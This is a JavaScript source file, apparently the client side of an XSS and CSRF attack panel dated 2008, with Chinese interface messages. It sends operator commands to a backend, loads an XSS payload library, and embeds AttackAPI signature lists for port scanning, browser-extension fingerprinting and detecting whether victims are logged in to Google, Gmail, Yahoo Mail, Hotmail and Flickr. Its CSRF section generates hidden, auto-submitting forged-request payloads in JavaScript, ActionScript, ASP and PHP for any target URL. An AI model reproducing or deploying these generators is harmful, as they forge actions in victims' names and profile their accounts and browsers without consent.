//code by yuxi4n

function _g(x){return document.getElementById(x)}	

var knownxss = {
	Author: 'yuxi4n',
	time: '2008-12-01'};

knownxss.ajax = function(){
	var request = false;
	if(window.XMLHttpRequest) {
		request = new XMLHttpRequest();
	} else if(window.ActiveXObject) {
		var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
		for(var i=0; i<versions.length; i++) {
			try {
				request = new ActiveXObject(versions[i]);
			} catch(e) {}
		}
	}
	return request;
}

var xhr = knownxss.ajax();

knownxss.core = {};
knownxss.core.create_cmd = function(){
	_g("sys_tip").innerHTML = "正在输出命令……";
	_g("sys_tip").style.display = "block";
    var cmd = 'cmd=' + encodeURIComponent(_g('cmd').value);
    xhr.open ("POST", "create_cmd.php", true);
    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    xhr.onreadystatechange=function() {
        if(xhr.readyState==4) {
            if(xhr.status==200) {
                _g("sys_tip").innerHTML = "命令输出成功……";
				//_g("sys_tip").style.display = "block";
				setTimeout("_g('sys_tip').style.display = 'none'",2000);
            }
        }
    }
    xhr.send(cmd);
}

knownxss.xss_codz = {}
knownxss.xss_codz.attack_api = function(option){
	if(option!=""){
		var ss="AttackAPI.dom.signatures = new Object();\n";
		ss+="\n";
		ss+="AttackAPI.dom.signatures.ports = [\n";
		ss+="	21, 22, 23, 25, 53, 80, 110, 118, 137, 139, 143, 161, 389, 443, 445, 547, 8000, 8008, 8080, 8888];\n";
		ss+="\n";
		ss+="AttackAPI.dom.signatures.sites = [\n";
		ss+="	\'http:\/\/www.yahoo.com\/\',\n";
		ss+="	\'http:\/\/www.google.com\/\',\n";
		ss+="	\'http:\/\/www.myspace.com\/\',\n";
		ss+="	\'http:\/\/www.msn.com\/\',\n";
		ss+="	\'http:\/\/www.ebay.com\/\',\n";
		ss+="	\'http:\/\/www.youtube.com\/\',\n";
		ss+="	\'http:\/\/www.facebook.com\/\',\n";
		ss+="	\'http:\/\/www.wikipedia.org\/\',\n";
		ss+="	\'http:\/\/www.craigslist.org\/\',\n";
		ss+="	\'http:\/\/www.amazon.com\/\',\n";
		ss+="	\'http:\/\/www.live.com\/\',\n";
		ss+="	\'http:\/\/www.blogger.com\/\',\n";
		ss+="	\'http:\/\/www.aol.com\/\',\n";
		ss+="	\'http:\/\/www.cnn.com\/\',\n";
		ss+="	\'http:\/\/www.go.com\/\',\n";
		ss+="	\'http:\/\/www.microsoft.com\/\',\n";
		ss+="	\'http:\/\/www.comcast.net\/\',\n";
		ss+="	\'http:\/\/www.imdb.com\/\',\n";
		ss+="	\'http:\/\/www.weather.com\/\',\n";
		ss+="	\'http:\/\/www.digg.com\/\'];\n";
		ss+="\n";
		ss+="AttackAPI.dom.signatures.extensions = [\n";
		ss+="	{name: \'Adblock Plus\', url: \'chrome:\/\/adblockplus\/skin\/adblockplus.png\'},\n";
		ss+="	{name: \'Customize Google\', url: \'chrome:\/\/customizegoogle\/skin\/32x32.png\'},\n";
		ss+="	{name: \'DownThemAll!\', url: \'chrome:\/\/dta\/content\/immagini\/icon.png\'},\n";
		ss+="	{name: \'Faster Fox\', url: \'chrome:\/\/fasterfox\/skin\/icon.png\'},\n";
		ss+="	{name: \'Flash Block\', url: \'chrome:\/\/flashblock\/skin\/flash-on-24.png\'},\n";
		ss+="	{name: \'FlashGot\', url: \'chrome:\/\/flashgot\/skin\/icon32.png\'},\n";
		ss+="	{name: \'Google Toolbar\', url: \'chrome:\/\/google-toolbar\/skin\/icon.png\'},\n";
		ss+="	{name: \'Greasemonkey\', url: \'chrome:\/\/greasemonkey\/content\/status_on.gif\'},\n";
		ss+="	{name: \'IE Tab\', url: \'chrome:\/\/ietab\/skin\/ietab-button-ie16.png\'},\n";
		ss+="	{name: \'IE View\', url: \'chrome:\/\/ieview\/skin\/ieview-icon.png\'},\n";
		ss+="	{name: \'JS View\', url: \'chrome:\/\/jsview\/skin\/jsview.gif\'},\n";
		ss+="	{name: \'Live HTTP Headers\', url: \'chrome:\/\/livehttpheaders\/skin\/img\/Logo.png\'},\n";
		ss+="	{name: \'SEO For Firefox\', url: \'chrome:\/\/seo4firefox\/content\/icon32.png\'},\n";
		ss+="	{name: \'Search Status\', url: \'chrome:\/\/searchstatus\/skin\/cax10.png\'},\n";
		ss+="	{name: \'Server Switcher\', url: \'chrome:\/\/switcher\/skin\/icon.png\'},\n";
		ss+="	{name: \'StumbleUpon\', url: \'chrome:\/\/stumbleupon\/content\/skin\/logo32.png\'},\n";
		ss+="	{name: \'Torrent-Search Toolbar\', url: \'chrome:\/\/torrent-search\/skin\/v.png\'},\n";
		ss+="	{name: \'User Agent Switcher\', url: \'chrome:\/\/useragentswitcher\/content\/logo.png\'},\n";
		ss+="	{name: \'View Source With\', url: \'chrome:\/\/viewsourcewith\/skin\/ff\/tb16.png\'},\n";
		ss+="	{name: \'Web Developer\', url: \'chrome:\/\/webdeveloper\/content\/images\/logo.png\'}];\n";
		ss+="\n";
		ss+="AttackAPI.dom.signatures.states = [\n";
		ss+="	{name: \'Google Logged In User\', url: \'https:\/\/www.google.com\/accounts\/ManageAccount\', message: \'XML tag name mismatch\', line: 91},\n";
		ss+="	{name: \'GMail Logged In User\', url: \'http:\/\/mail.google.com\/mail\/\', message: \'XML tag name mismatch\', line: 8},\n";
		ss+="	{name: \'MSN Logged In User\', url: \'http:\/\/my.msn.com\/\', message: \'missing } in XML expression\', line: 1},\n";
		ss+="	{name: \'Hotmail Logged In User\', url: \'http:\/\/www.hotmail.com\/\', message: \'missing } in XML expression\', line: 1},\n";
		ss+="	{name: \'Yahoo Mail Logged In User\', url: \'http:\/\/mail.yahoo.com\/\', message: \'missing } in XML expression\', line: 12},\n";
		ss+="	{name: \'Flickr Logged In User\', url: \'http:\/\/www.flickr.com\/account\', message: \'syntax error\', line: 1}];\n";
		if(option=="AttackAPI.dom.signatures") _g('Ww_B_1_textarea').value=ss;
		else _g('Ww_B_1_textarea').value=option + " = " + eval(option);
	}else _g('Ww_B_1_textarea').value="";
}
knownxss.xss_codz.lib = function(){
	xhr.open ("GET", "get_xss_codz.php", true);
    xhr.onreadystatechange=function() {
        if(xhr.readyState == 4) {
            if(xhr.status == 200) {
                xss_codz = xhr.responseText;
				_g("XSSCodz_textarea").value = xss_codz;
            }
        }
    }
    xhr.send(null);
}

knownxss.csrf_codz = {};
knownxss.csrf_codz.lib = function(){
	csrf_type = _g("csrftype").value;
	csrf_url = _g("csrfurl").value;
	csrf_value = _g("csrfvalue").value
	if(csrf_type == "null"){
		_g("sys_tip").innerHTML = "请选择CSRF类型。";
		_g("sys_tip").style.display = "block";
		setTimeout("_g('sys_tip').style.display = 'none'",2000);
		return;
	}
	if(csrf_url == ""){
		_g("sys_tip").innerHTML = "请输入URL。";
		_g("sys_tip").style.display = "block";
		setTimeout("_g('sys_tip').style.display = 'none'",2000);
		return;
	}
	if(csrf_value == ""){
		_g("sys_tip").innerHTML = "请输入参数值。";
		_g("sys_tip").style.display = "block";
		setTimeout("_g('sys_tip').style.display = 'none'",2000);
		return;
	}
	if(csrf_type == 0){
		_g("Ww_B_4_textarea").value = csrf_url + "?" + csrf_value;
	}else{
		csrf_lang = _g("csrflang").value;
		if(csrf_lang == "null"){
			_g("sys_tip").innerHTML = "请选择生成CSRF代码使用的语言。";
			_g("sys_tip").style.display = "block";
			setTimeout("_g('sys_tip').style.display = 'none'",2000);
			return;
		}
		
		switch(csrf_lang){
			case "js":
				_js = "function new_form(){\n";
				_js += "	var f = document.createElement(\"form\");\n";
				_js += "	document.body.appendChild(f);\n";
				_js += "	f.method = \"post\";\n";
				_js += "	return f;\n";
				_js += "}\n";
				_js += "function create_elements(eForm, eName, eValue){\n";
				_js += "	var e = document.createElement(\"input\");\n";
				_js += "	eForm.appendChild(e);\n";
				_js += "	e.type = \'text\';\n";
				_js += "	e.name = eName;\n";
				_js += "	if(!document.all){e.style.display = \'none\';}else{\n";
				_js += "		e.style.display = \'block\';\n";
				_js += "		e.style.width = \'0px\';\n";
				_js += "		e.style.height = \'0px\';\n";
				_js += "	}\n";
				_js += "	e.value = eValue;\n";
				_js += "	return e;\n";
				_js += "}\n";
				_js += "var _f = new_form();\n";
				js_args = csrf_value.split("&");
				for(i=0; i<js_args.length; i++){
					js_arg = js_args[i].split("=");
					_js += "create_elements(_f, \"" + js_arg[0] + "\", \"" + js_arg[1] + "\");\n";
				}
				_js += "_f.action= \"" + csrf_url + "\";\n";
				_js += "_f.submit();\n";
				_g("Ww_B_4_textarea").value = _js;
				break;
			case "as":
				as_args = csrf_value.split("&");
				_as = "import flash.net.URLRequest;\n";
				_as += "var url = new URLRequest(\"" + csrf_url + "\");\n";
				_as += "var _v = new URLVariables();\n";
				_as += "_v = \"";
				for(i=0; i<as_args.length; i++){
					as_arg = as_args[i].split("=");
					if(i == as_args.length-1){_as += as_arg[0] + "=" + as_arg[1] + "\";\n"}else{
						_as += as_arg[0] + "=" + as_arg[1] + "&";
					}
				}
				_as += "url.method = \"POST\";\n";
				_as += "url.data = _v;\n";
				_as += "sendToURL(url);\n";
				_g("Ww_B_4_textarea").value = _as;
				break;
			case "asp":
				asp_args = csrf_value.split("&");
				_asp = "<%\n";
				_asp += "s = \"<form method=\'post\' action=\'" + csrf_url + "\'>\"\n";
				for(i=0; i<asp_args.length; i++){
					asp_arg = asp_args[i].split("=");
					_asp += "s = s+\"<input type=\'text\' value=\'" + asp_arg[1] + "\' name=\'" + asp_arg[0] + "\' style=\'display:none!important;display:block;width=0;height=0\' \/>\"\n";
				}
				_asp += "s = s+\"<\/form>\"\n";
				_asp += "s = s+\"<script>document.forms[0].submit();<\/script>\"\n";
				_asp += "response.write(s)\n";
				_asp += "%>\n";
				_g("Ww_B_4_textarea").value = _asp;
				break;
			case "php":
				php_args = csrf_value.split("&");
				_php = "<?php\n";
				_php += "$s = \"<form method=\'post\' action=\'" + csrf_url + "\'>\";\n";
				for(i=0; i<php_args.length; i++){
					php_arg = php_args[i].split("=");
					_php += "$s = $s.\"<input type=\'text\' value=\'" + php_arg[1] + "\' name=\'" + php_arg[0] + "\' style=\'display:none!important;display:block;width=0;height=0\' \/>\";\n";
				}
				_php += "$s = $s.\"<\/form>\";\n";
				_php += "$s = $s.\"<script>document.forms[0].submit();<\/script>\";\n";
				_php += "echo($s);\n";
				_php += "?>\n";
				_php += "\n";
				_g("Ww_B_4_textarea").value = _php;
				break;
			case "py":
				_g("Ww_B_4_textarea").value = 'null';
				break;
		}
	}
}
